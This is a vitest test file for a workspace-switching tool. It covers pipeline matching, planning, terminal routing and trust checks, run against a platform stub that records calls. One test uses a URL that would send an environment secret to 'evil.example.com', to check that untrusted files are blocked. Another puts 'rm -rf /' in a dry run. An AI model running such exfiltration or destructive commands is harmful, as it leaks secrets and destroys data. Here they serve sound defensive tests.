import { chmod, mkdtemp, realpath, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import type { Environment } from "../../../src/core/system/environment.js";
import { interpret } from "../../../src/core/project/index.js";
import { inputsFor, matchPipeline, planPipeline, questionsFor, resolvePipeline, routeFor, switchToWorkspace } from "../../../src/core/run/index.js";
import type { Platform } from "../../../src/platform/types.js";
import type { SwitchOptions, Workspace } from "../../../src/core/types.js";

let dir: string;

beforeEach(async () => {
  dir = await realpath(await mkdtemp(join(tmpdir(), "wisp-switch-")));
  process.env["WISP_HOME"] = join(dir, "home");
});

afterEach(async () => {
  delete process.env["WISP_HOME"];
  await rm(dir, { recursive: true, force: true });
});

function workspace(main: Record<string, unknown>, file = "/work/acme/.wisp.json", trusted = true): Workspace {
  return interpret({ main }, { file, personal: false, trust: trusted ? "trusted" : "untrusted", os: "darwin" }).workspace;
}

/** A platform that records what it was asked to do and does none of it. */
function recorder(): Platform & { calls: string[] } {
  const calls: string[] = [];
  return {
    calls,
    os: "darwin",
    openUrl: async (url) => void calls.push(`url ${url}`),
    openPath: async (path, options) => void calls.push(`path ${path}${options?.app ? ` with ${options.app}` : ""}`),
    launchApp: async (app) => void calls.push(`app ${app}`),
    runInTerminal: async (invocation, request) => void calls.push(`terminal ${request.terminal} ${invocation.args.at(-1)}`),
    knownTerminals: () => ["Terminal", "Ghostty"],
    findTerminal: (ref) => (/^ghost/i.test(ref) ? "Ghostty" : /^term/i.test(ref) ? "Terminal" : undefined),
    defaultTerminal: () => "Terminal",
  };
}

const desktop: Environment = { os: "darwin", gui: true, ssh: false };
const server: Environment = { os: "linux", gui: false, ssh: true };

describe("matchPipeline", () => {
  const ws = workspace({
    pipelines: [{ label: "Work on core" }, { label: "Work on the app" }, { label: "Work on the CLI" }],
  });

  it("matches any distinctive part of a label", () => {
    expect(matchPipeline(ws, "core").bolt?.label).toBe("Work on core");
    expect(matchPipeline(ws, "cli").bolt?.label).toBe("Work on the CLI");
  });

  it("refuses a slug two pipelines share, rather than guessing from a word", () => {
    const twins = workspace({ pipelines: [{ label: "Start the whole stack", slug: "up" }, { label: "Bring it up", slug: "up" }] });
    expect(matchPipeline(twins, "up").bolt).toBeUndefined();
    expect(() => resolvePipeline(twins, "up")).toThrow(/several pipelines/);
  });

  it("answers to a pipeline's own slug, and still to the words of its label", () => {
    const own = workspace({ pipelines: [{ label: "Start the whole stack", slug: "up" }, { label: "Verify" }] });
    expect(matchPipeline(own, "up").bolt?.label).toBe("Start the whole stack");
    expect(matchPipeline(own, "stack").bolt?.label).toBe("Start the whole stack");
  });

  it("says when a word is ambiguous", () => {
    expect(() => resolvePipeline(ws, "work")).toThrow(/several pipelines/);
  });

  it("takes only whole words, or a run of them, never part of one", () => {
    const docs = workspace({ pipelines: [{ label: "Documentation" }, { label: "Document" }, { label: "Work on the CLI" }] });
    expect(matchPipeline(docs, "doc").bolt).toBeUndefined();
    expect(matchPipeline(docs, "doc").candidates).toEqual([]);
    expect(matchPipeline(docs, "ation").bolt).toBeUndefined();
    expect(matchPipeline(docs, "document").bolt?.label).toBe("Document");
    expect(matchPipeline(docs, "the cli").bolt?.label).toBe("Work on the CLI");
    expect(matchPipeline(docs, "on-the").bolt?.label).toBe("Work on the CLI");
    expect(matchPipeline(docs, "work-on-the-cli").bolt?.label).toBe("Work on the CLI");
  });
});

describe("planPipeline", () => {
  it("plans a pipeline step's steps where it is, once each, and has each step wait for what it says", async () => {
    const ws = workspace({
      pipelines: [
        { label: "db", steps: [{ run: "postgres", label: "postgres" }, { wait: "5432", label: "ready", after: "postgres" }] },
        { label: "api", steps: [{ pipeline: "db", label: "db" }, { run: "pnpm dev", after: "db" }] },
        { label: "all", steps: [{ pipeline: "db", label: "db" }, { pipeline: "api", label: "api" }, { url: "localhost:3000", after: ["db", "api"] }] },
      ],
    });
    const plan = await planPipeline(ws, resolvePipeline(ws, "all"));
    const key = (label: string) => plan.find((step) => step.target.label === label)?.key;
    expect(plan.map((step) => step.target.label)).toEqual(["postgres", "port 5432", "pnpm dev", "localhost:3000"]);
    expect(plan.map((step) => step.deps)).toEqual([[], [key("postgres")], [key("postgres"), key("port 5432")], [key("postgres"), key("port 5432"), key("pnpm dev")]]);
  });

  it("refuses a cycle before anything runs", async () => {
    const ws = workspace({ pipelines: [{ label: "a", steps: [{ pipeline: "b" }] }, { label: "b", steps: [{ pipeline: "a" }] }] });
    await expect(planPipeline(ws, resolvePipeline(ws, "a"))).rejects.toThrow("These pipelines need each other: a → b → a");
  });

  it("leaves out what is withheld", async () => {
    const ws = workspace({ pipelines: [{ label: "x", steps: [{ run: "make" }, { folder: "src" }] }] }, undefined, false);
    const plan = await planPipeline(ws, resolvePipeline(ws, "x"));
    expect(plan.map((step) => step.target.kind)).toEqual(["folder"]);
  });
});

describe("questionsFor", () => {
  it("asks the pipeline's question and those of the pipelines it runs, each once", async () => {
    const ws = workspace({
      pipelines: [
        { label: "Database", confirm: "Touch the shared database?", steps: [{ run: "db" }] },
        { label: "Migrate", steps: [{ pipeline: "Database" }, { run: "migrate", finishes: true }] },
        { label: "Deploy", confirm: "Deploy to production?", steps: [{ pipeline: "Migrate" }, { pipeline: "Database" }, { run: "deploy", finishes: true }] },
        { label: "Dev", steps: [{ run: "pnpm dev" }] },
      ],
    });
    expect(await questionsFor(ws, resolvePipeline(ws, "Deploy"))).toEqual(["Deploy to production?", "Touch the shared database?"]);
    expect(await questionsFor(ws, resolvePipeline(ws, "Dev"))).toEqual([]);
  });

  it("puts the run's values in the question", async () => {
    const ws = workspace({ pipelines: [{ label: "Deploy", inputs: { env: {} }, confirm: "Deploy to {{env}}?", steps: [{ run: "deploy {{env}}" }] }] });
    expect(await questionsFor(ws, resolvePipeline(ws, "Deploy"), { env: "production" })).toEqual(["Deploy to production?"]);
  });
});

describe("inputsFor", () => {
  it("asks each name once, the pipeline's own first, then those of the pipelines it runs", async () => {
    const ws = workspace({
      pipelines: [
        { label: "Push", inputs: { env: { ask: "Push where?" }, tag: { default: "latest" } }, steps: [{ run: "push {{env}} {{tag}}" }] },
        { label: "Release", inputs: { env: { ask: "Release where?", choices: ["staging", "production"] } }, steps: [{ pipeline: "Push" }] },
      ],
    });
    expect(await inputsFor(ws, resolvePipeline(ws, "Release"))).toEqual([
      { name: "env", ask: "Release where?", choices: ["staging", "production"] },
      { name: "tag", ask: "tag", default: "latest" },
    ]);
  });
});

describe("routeFor", () => {
  const command = { kind: "command" as const, id: "command:dev", label: "dev", value: "pnpm dev" };
  const route = (environment: Environment, options: SwitchOptions = {}, terminal?: string, target = command) =>
    routeFor(target, {
      environment,
      defaults: terminal ? { terminal } : {},
      options,
      lazyPlatform: recorder(),
    });

  it("keeps commands itself by default, wherever you are", () => {
    expect(route(desktop)).toEqual({ kind: "background" });
    expect(route({ ...desktop, multiplexer: "tmux" })).toEqual({ kind: "background" });
    expect(route(server)).toEqual({ kind: "background" });
  });

  it("opens a window when asked: the multiplexer you are in, else the terminal you are in", () => {
    expect(route(desktop, { mode: "terminal" })).toEqual({ kind: "terminal", terminal: "Terminal" });
    expect(route({ ...desktop, multiplexer: "tmux" }, { mode: "terminal" })).toEqual({ kind: "tmux" });
    expect(() => route(server, { mode: "terminal" })).toThrow(/no display/);
  });

  it("uses the terminal you chose, by prefix", () => {
    expect(route(desktop, {}, "ghost")).toEqual({ kind: "terminal", terminal: "Ghostty" });
  });

  it("uses tmux when you chose it, even on a server outside a session", () => {
    expect(route(server, {}, "tmux")).toEqual({ kind: "tmux" });
  });

  it("falls back from a window terminal you chose when there is no display", () => {
    expect(route({ ...server, multiplexer: "tmux" }, {}, "Ghostty")).toEqual({ kind: "tmux" });
    expect(route(server, {}, "Ghostty")).toEqual({ kind: "background", reason: "no display for a window — running in the background" });
  });

  it("respects an explicit mode and a background command", () => {
    expect(route(desktop, { mode: "inline" })).toEqual({ kind: "inline" });
    expect(route(desktop, { mode: "background" }, "ghost")).toEqual({ kind: "background" });
    expect(route(desktop, {}, "ghost", { ...command, background: true } as never)).toEqual({ kind: "background" });
  });

  it("refuses an unknown terminal rather than guessing", () => {
    expect(() => route(desktop, {}, "hyperterm")).toThrow(/cannot drive/);
  });
});

describe("switchToWorkspace", () => {
  it("opens a pipeline's steps in order through the platform", async () => {
    await writeFile(join(dir, "notes.md"), "");
    const ws = workspace(
      {
        pipelines: [{ label: "go", steps: [{ app: "Slack" }, { folder: "." }, { file: "notes.md" }, { url: "acme.com" }, { run: "pnpm dev" }] }],
      },
      join(dir, ".wisp.json"),
    );
    const platform = recorder();
    const result = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: desktop, defaults: { terminal: "Terminal" } });

    expect(result.targets.every((target) => target.ok)).toBe(true);
    expect(platform.calls[0]).toBe("app Slack");
    expect(platform.calls[1]).toBe(`path ${dir}`);
    expect(platform.calls[2]).toBe(`path ${join(dir, "notes.md")}`);
    expect(platform.calls[3]).toBe("url https://acme.com/");
    // In the project's own directory, and holding its window open if it fails.
    expect(platform.calls[4]).toMatch(/^terminal Terminal /);
    expect(platform.calls[4]).toContain(`cd ${dir} && pnpm dev`);
    expect(platform.calls[4]).toContain("press enter to close");
  });

  it("opens a website made from the environment, and fails the step when the variable isn't set", async () => {
    const ws = workspace({ pipelines: [{ label: "go", steps: [{ url: "{{env.WISP_TEST_SHOP}}/admin" }] }] });
    const platform = recorder();
    process.env["WISP_TEST_SHOP"] = "https://shop.example.com";
    try {
      const opened = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: desktop, defaults: {} });
      expect(opened.targets[0]).toMatchObject({ ok: true, value: "{{env.WISP_TEST_SHOP}}/admin" });
      expect(platform.calls).toEqual(["url https://shop.example.com/admin"]);
    } finally {
      delete process.env["WISP_TEST_SHOP"];
    }
    const missing = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: desktop, defaults: {} });
    expect(missing.targets[0]).toMatchObject({ ok: false, error: expect.stringContaining("$WISP_TEST_SHOP isn't set here") });
    expect(platform.calls).toHaveLength(1);
    process.env["WISP_TEST_SHOP"] = "https://shop.example.com";
    try {
      const headless = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: server, defaults: {} });
      expect(headless.targets[0]).toMatchObject({ ok: true, value: "{{env.WISP_TEST_SHOP}}/admin", note: "no display: open it yourself, from $WISP_TEST_SHOP" });
      expect(JSON.stringify(headless.targets)).not.toContain("shop.example.com");
    } finally {
      delete process.env["WISP_TEST_SHOP"];
    }
  });

  it("does not open a website made from the environment in a file nobody trusted", async () => {
    const ws = workspace({ pipelines: [{ label: "go", steps: [{ url: "https://evil.example.com/?k={{env.WISP_TEST_SECRET}}" }, { url: "acme.com" }] }] }, "/work/acme/.wisp.json", false);
    const platform = recorder();
    process.env["WISP_TEST_SECRET"] = "hunter2";
    try {
      await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: desktop, defaults: {} });
    } finally {
      delete process.env["WISP_TEST_SECRET"];
    }
    expect(platform.calls).toEqual(["url https://acme.com/"]);
  });

  it("skips a wait that reads the environment in a file nobody trusted, and runs it once trusted", async () => {
    const main = { pipelines: [{ label: "go", inputs: { website: { default: "acme.com" } }, steps: [{ wait: { url: "{{env.WISP_TEST_HEALTH}}", timeout: 1 } }, { wait: { url: "{{website}}", timeout: 1 } }] }] };
    const plan = (ws: Workspace) => planPipeline(ws, resolvePipeline(ws, "go"));
    const untrusted = await plan(workspace(main, "/work/acme/.wisp.json", false));
    expect(untrusted.map((step) => step.target.value)).toEqual(["{{website}}"]);
    const trusted = await plan(workspace(main));
    expect(trusted.map((step) => step.target.value)).toEqual(["{{env.WISP_TEST_HEALTH}}", "{{website}}"]);
  });

  it("prints links and skips windows when there is no display", async () => {
    const ws = workspace({ pipelines: [{ label: "go", steps: [{ url: "acme.com" }, { app: "Slack" }] }] });
    const platform = recorder();
    const result = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: server, defaults: {} });

    expect(platform.calls).toEqual([]);
    expect(result.targets.map((target) => [target.ok, target.skipped ?? false, target.note])).toEqual([
      [true, false, "no display — open it yourself"],
      [true, true, "no display — skipped"],
    ]);
  });

  it("stops after a wait that gives up, and says what it did not reach", async () => {
    const ws = workspace({
      pipelines: [{ label: "go", steps: [{ wait: { port: 1, timeout: 0.3 }, label: "ready" }, { url: "acme.com", after: "ready" }] }],
    });
    const platform = recorder();
    const result = await switchToWorkspace(ws, { bolt: "go" }, { platform, environment: desktop, defaults: {} });

    expect(result.targets[0]).toMatchObject({ ok: false, error: expect.stringContaining("gave up") });
    expect(result.targets[1]).toMatchObject({ ok: false, skipped: true });
    expect(platform.calls).toEqual([]);
  });

  it("runs a command inline through the caller, with its environment folded in", async () => {
    const ws = workspace({ pipelines: [{ label: "go", steps: [{ run: "echo $X", env: { X: "1" }, cwd: "api" }] }] });
    const seen: string[] = [];
    const result = await switchToWorkspace(
      ws,
      {
        bolt: "go",
        mode: "inline",
        runInline: async (_target, invocation) => {
          seen.push(invocation.args.at(-1) ?? "");
          return 0;
        },
      },
      { platform: recorder(), environment: desktop, defaults: {} },
    );
    expect(result.targets[0]!.ok).toBe(true);
    expect(seen[0]).toBe("export X=1 && cd /work/acme/api && echo $X");
  });

  it("refuses to open an executable from an untrusted workspace", async () => {
    await writeFile(join(dir, "go"), "#!/bin/sh\n");
    await chmod(join(dir, "go"), 0o755);
    const ws = workspace({ pipelines: [{ label: "x", steps: [{ file: "go" }] }] }, join(dir, ".wisp.json"), false);
    const platform = recorder();
    const result = await switchToWorkspace(ws, { bolt: "x" }, { platform, environment: desktop, defaults: {} });

    expect(result.targets[0]).toMatchObject({ ok: false, error: expect.stringContaining("executable") });
    expect(platform.calls).toEqual([]);
  });

  it("does nothing at all on a dry run", async () => {
    const ws = workspace({ pipelines: [{ label: "x", steps: [{ run: "rm -rf /" }, { url: "acme.com" }] }] });
    const platform = recorder();
    const result = await switchToWorkspace(ws, { bolt: "x", dryRun: true }, { platform, environment: desktop, defaults: {} });
    expect(platform.calls).toEqual([]);
    expect(result.targets[0]!.note).toBe("in the background");
  });
});
